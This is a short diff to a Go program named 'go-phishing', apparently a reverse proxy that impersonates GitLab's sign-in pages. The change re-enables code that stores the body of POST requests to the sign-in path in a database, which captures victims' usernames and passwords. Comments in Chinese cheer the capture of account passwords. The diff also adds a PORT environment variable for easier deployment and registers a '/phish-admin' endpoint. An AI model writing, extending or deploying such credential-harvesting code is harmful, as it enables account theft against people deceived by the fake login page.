@@ -7,6 +7,7 @@ import (
 	"go-phishing/db"
 	"io/ioutil"
 	"net/http"
+	"os"
 	"regexp"
 	"strings"
 )
@@ -55,9 +56,9 @@ func cloneRequest(r *http.Request) *http.Request {
 	// } else {
 	// 	upstreamURL = "https://about.gitlab.com"
 	// }
-	// if r.URL.String() == "/users/sign_in" && method == "POST" {
-	// 	db.Insert(bodyStr)
-	// }
+	if r.URL.String() == "/users/sign_in" && method == "POST" {
+		db.Insert(bodyStr)
+	}
 	// 如果是 POST 到 /session 的請求
 	// 就把 body 存進資料庫內（帳號密碼 GET !!）
 	if r.URL.String() == "/session" && r.Method == "POST" {
@@ -183,7 +184,9 @@ func main() {
 	// 預設值是 ":8080"
 	flag.StringVar(&port, "port", "8080", "部署在哪個 port")
 	flag.Parse()
-
+	if p, ok := os.LookupEnv("PORT"); ok {
+		port = p
+	}
 	db.Connect()
 	http.HandleFunc("/phish-admin", adminHandler)
 	http.HandleFunc("/", handler)
